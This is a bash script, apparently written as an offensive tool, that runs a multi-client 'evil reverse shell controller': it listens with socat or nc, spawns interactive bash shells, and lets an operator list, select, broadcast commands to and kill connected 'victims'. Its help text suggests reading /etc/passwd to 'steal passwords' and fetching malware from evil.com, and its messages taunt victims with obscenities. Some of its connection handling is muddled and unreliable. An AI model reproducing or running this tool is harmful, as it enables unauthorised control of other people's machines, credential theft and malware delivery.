#!/bin/bash
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <port> <max_clients>"
    exit 1
fi
PORT=$1
MAX_CLIENTS=$2
declare -A victim_pids
declare -A victim_ips
declare -A victim_fifos
CURRENT_VICTIM=""
MAIN_PID=$$
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
mkdir -p /tmp/evil_shell_$$ 2>/dev/null
cleanup() {
    echo -e "${RED}[*] Terminating all victims and cleaning up...${NC}"
    for pid in "${victim_pids[@]}"; do
        kill -9 $pid 2>/dev/null
    done
    pkill -P $MAIN_PID 2>/dev/null
    rm -rf /tmp/evil_shell_$$
    rm -f /tmp/victim_*
    exit 0
}
trap cleanup INT TERM EXIT
handle_victim() {
    local ip="$1"
    local fd="$2"
    local fifo="/tmp/evil_shell_$$/victim_${ip//./_}"
    mkfifo "$fifo"
    victim_fifos["$ip"]="$fifo"
    echo -e "${GREEN}[+] Victim $ip connected, setting up control...${NC}"
    while read -r line <&${fd}; do
        if [[ -n "$line" ]]; then
            if [[ "$CURRENT_VICTIM" == "$ip" ]]; then
                echo -e "${YELLOW}[$ip] $line${NC}"
            else
                echo -e "${GREEN}[$ip] $line${NC}"
            fi
        fi
    done &
    local output_pid=$!
    while true; do
        if [[ -f "$fifo" ]]; then
            local cmd
            if read -r cmd < "$fifo"; then
                echo "$cmd" >&${fd}
                sleep 0.1
            fi
        else
            break
        fi
    done &
    victim_pids["$ip"]="$!"
    wait $output_pid
}
start_listener() {
    echo -e "${GREEN}[+] Starting evil listener on port $PORT...${NC}"
    if command -v socat &>/dev/null; then
        socat TCP-LISTEN:$PORT,reuseaddr,fork,max-children=$MAX_CLIENTS \
              EXEC:'bash -i',pty,stderr,setsid,sigint,sane 2>/dev/null | \
        while IFS= read -r line; do
            # This is simplified - in reality you'd need proper session handling
            echo -e "${YELLOW}[+] Raw output: $line${NC}"
        done &
    else
        while true; do
            nc -l -p $PORT -c "
                echo '[*] Evil shell connected'
                echo '[*] Your system is now mine, bitch'
                echo '[*] Waiting for commands...'
                exec bash -i 2>&1
            " > /tmp/victim_$$_$(date +%s) 2>&1 &
            local victim_pid=$!
            local victim_ip=$(netstat -an | grep ":$PORT" | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | tail -1)
            if [[ -n "$victim_ip" ]]; then
                victim_ips["$victim_ip"]="active"
                echo -e "${GREEN}[+] New victim: $victim_ip (PID: $victim_pid)${NC}"
                exec {fd}<>/dev/tcp/$victim_ip/$PORT 2>/dev/null
                if [[ $? -eq 0 ]]; then
                    handle_victim "$victim_ip" "$fd" &
                    victim_pids["$victim_ip"]=$!
                fi
            fi
            sleep 1
        done &
    fi
    LISTENER_PID=$!
}
send_to_victim() {
    local ip="$1"
    local command="$2"
    if [[ -n "${victim_fifos[$ip]}" && -p "${victim_fifos[$ip]}" ]]; then
        echo "$command" > "${victim_fifos[$ip]}"
        echo -e "${YELLOW}[Command sent to $ip: $command]${NC}"
    else
        echo -e "${RED}[!] No active connection to $ip, you fucking idiot${NC}"
    fi
}
control_loop() {
    echo -e "${RED}"
    cat << "EOF"
   ___      _ _   ____  _          _ _ 
  / _ \___ | | | / ___|| |__   ___| | |
 | | |/ _ \| | | \___ \| '_ \ / _ \ | |
 | |_| (_) | | |  ___) | | | |  __/ | |
  \___\___/|_|_| |____/|_| |_|\___|_|_|
EOF
    echo -e "${NC}"
    echo -e "${RED}Evil Reverse Shell Controller v2.0 - FIXED${NC}"
    echo -e "${RED}Now with actual victim control, you incompetent fuck${NC}"
    while true; do
        read -p "evil@hell:~$ " cmd
        case $cmd in
            list)
                echo -e "${GREEN}[+] Active victims:${NC}"
                if [ ${#victim_ips[@]} -eq 0 ]; then
                    echo "    No victims connected... go hack some shit! 😈"
                else
                    for ip in "${!victim_ips[@]}"; do
                        echo "    $ip - ${victim_ips[$ip]} (PID: ${victim_pids[$ip]})"
                    done
                fi
                ;;
            select\ *)
                selected_ip=$(echo $cmd | cut -d' ' -f2)
                if [[ -n "${victim_ips[$selected_ip]}" ]]; then
                    CURRENT_VICTIM=$selected_ip
                    echo -e "${GREEN}[+] Selected victim: $selected_ip${NC}"
                    echo -e "${YELLOW}[*] Type 'back' to return to main menu${NC}"
                    echo -e "${YELLOW}[*] Commands will now be sent to this victim${NC}"
                    while true; do
                        read -p "evil@hell[$selected_ip]:~$ " victim_cmd
                        case $victim_cmd in
                            back)
                                CURRENT_VICTIM=""
                                break
                                ;;
                            exit)
                                cleanup
                                ;;
                            *)
                                send_to_victim "$selected_ip" "$victim_cmd"
                                ;;
                        esac
                    done
                else
                    echo -e "${RED}[!] Victim $selected_ip not found, dumbass${NC}"
                fi
                ;;
            broadcast\ *)
                broadcast_cmd=$(echo $cmd | cut -d' ' -f2-)
                echo -e "${RED}[+] Broadcasting to ALL victims: $broadcast_cmd${NC}"
                for ip in "${!victim_ips[@]}"; do
                    send_to_victim "$ip" "$broadcast_cmd" &
                done
                echo -e "${GREEN}[+] Command sent to ${#victim_ips[@]} victims${NC}"
                ;;
            kill\ *)
                kill_ip=$(echo $cmd | cut -d' ' -f2)
                if [[ -n "${victim_ips[$kill_ip]}" ]]; then
                    echo -e "${RED}[+] Terminating $kill_ip...${NC}"
                    send_to_victim "$kill_ip" "exit"
                    kill -9 "${victim_pids[$kill_ip]}" 2>/dev/null
                    rm -f "${victim_fifos[$kill_ip]}" 2>/dev/null
                    unset victim_ips["$kill_ip"]
                    unset victim_pids["$kill_ip"]
                    unset victim_fifos["$kill_ip"]
                    echo -e "${GREEN}[+] Victim $kill_ip terminated 😏${NC}"
                else
                    echo -e "${RED}[!] Victim not found, you blind fuck${NC}"
                fi
                ;;
            kill-all)
                echo -e "${RED}[+] Murdering ALL connections...${NC}"
                for ip in "${!victim_ips[@]}"; do
                    echo -e "${YELLOW}[+] Killing $ip...${NC}"
                    kill -9 "${victim_pids[$ip]}" 2>/dev/null
                    rm -f "${victim_fifos[$ip]}" 2>/dev/null
                done
                victim_ips=()
                victim_pids=()
                victim_fifos=()
                echo -e "${GREEN}[+] All victims terminated. The silence is beautiful 😈${NC}"
                ;;
            help)
                echo -e "${YELLOW}Available commands:${NC}"
                echo "  list                    - Show connected victims"
                echo "  select <ip>            - Control specific victim"
                echo "  broadcast <command>    - Send command to all victims"
                echo "  kill <ip>              - Kill specific victim"
                echo "  kill-all               - Kill ALL victims"
                echo "  back                   - Return to main menu"
                echo "  exit                   - Exit this beautiful evil tool"
                echo ""
                echo -e "${RED}Example victim commands:${NC}"
                echo "  whoami                 - Check privileges"
                echo "  id                     - Get user info"
                echo "  ls -la                 - List files"
                echo "  cat /etc/passwd        - Steal passwords"
                echo "  wget http://evil.com/malware - Download more evil"
                ;;
            exit)
                cleanup
                ;;
            *)
                if [[ -n "$CURRENT_VICTIM" ]]; then
                    send_to_victim "$CURRENT_VICTIM" "$cmd"
                else
                    echo -e "${RED}[!] Unknown command or no victim selected${NC}"
                    echo -e "${RED}[!] Type 'help' you fucking moron${NC}"
                fi
                ;;
        esac
    done
}
start_listener
sleep 2
control_loop